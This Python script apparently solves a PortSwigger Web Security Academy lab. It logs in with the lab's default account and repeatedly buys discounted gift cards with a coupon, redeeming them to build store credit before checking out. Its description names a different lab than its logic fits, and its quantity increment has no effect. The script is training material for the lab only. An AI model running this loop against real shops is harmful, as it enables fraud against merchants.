import requests
import argparse
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: Flawed enforcement of business rules')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

# GET CSRF AND COOKIE
r = requests.get("https://" + lab.id + ".web-security-academy.net/login")
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
headers = {"Cookie":f"session={r.cookies.get('session')}"}

# AUTH AS WIENER
r = requests.post("https://" + lab.id + ".web-security-academy.net/login", headers=headers, data={"csrf":csrf,"username":"wiener","password":"peter"}, allow_redirects=False)
wiener = r.cookies.get('session')
headers = {"Cookie":f"session={wiener}"}

# GET DISCOUNTED GIFT CARDS
credit = float(re.findall(r'(?<=<strong>Store credit: \$)(.*?)(?=<\/strong>)', requests.get("https://" + lab.id + ".web-security-academy.net/my-account", headers=headers).text)[0])
while credit < 935.90:
    
    quantity = 9
    
    try:
        requests.post("https://" + lab.id + ".web-security-academy.net/cart", headers=headers, data={"productId":2,"redir":"PRODUCT","quantity":quantity})
        r = requests.get("https://" + lab.id + ".web-security-academy.net/cart", headers=headers)
        
        csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
        requests.post("https://" + lab.id + ".web-security-academy.net/cart/coupon", headers=headers, data={"csrf":csrf,"coupon":"SIGNUP30"}, allow_redirects=False)
        requests.get("https://" + lab.id + ".web-security-academy.net/cart", headers=headers)
        
        requests.post("https://" + lab.id + ".web-security-academy.net/cart/checkout", headers=headers, data={"csrf":csrf})
        r = requests.get("https://" + lab.id + ".web-security-academy.net/cart/order-confirmation?order-confirmed=true", headers=headers)
        giftcards = re.findall(r'(?<=<td>)[A-Za-z0-9]{10}(?=<\/td>)', r.text)

        for code in range(quantity):
            r = requests.get("https://" + lab.id + ".web-security-academy.net/my-account", headers=headers)
            csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
            requests.post("https://" + lab.id + ".web-security-academy.net/gift-card", headers=headers, data={"csrf":csrf,"gift-card":giftcards[code]})
    
    except:
        continue
    
    credit = float(re.findall(r'(?<=<strong>Store credit: \$)(.*?)(?=<\/strong>)', requests.get("https://" + lab.id + ".web-security-academy.net/my-account", headers=headers).text)[0])
    print(f"Credit: ${credit}", end='', flush=True)
    print('\r', end='', flush=True)
    quantity += 1

# PUT JACKET INSIDE CART
requests.post("https://" + lab.id + ".web-security-academy.net/cart", headers=headers, data={"productId":1,"redir":"PRODUCT","quantity":1})
requests.post("https://" + lab.id + ".web-security-academy.net/cart/coupon", headers=headers, data={"csrf":csrf,"coupon":"SIGNUP30"}, allow_redirects=False)
requests.get("https://" + lab.id + ".web-security-academy.net/cart", headers=headers)

# CHECKOUT
requests.post("https://" + lab.id + ".web-security-academy.net/cart/checkout", headers=headers, data={"csrf":csrf})   
requests.get("https://" + lab.id + ".web-security-academy.net/cart/order-confirmation?order-confirmed=true", headers=headers)
print('\n')

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab")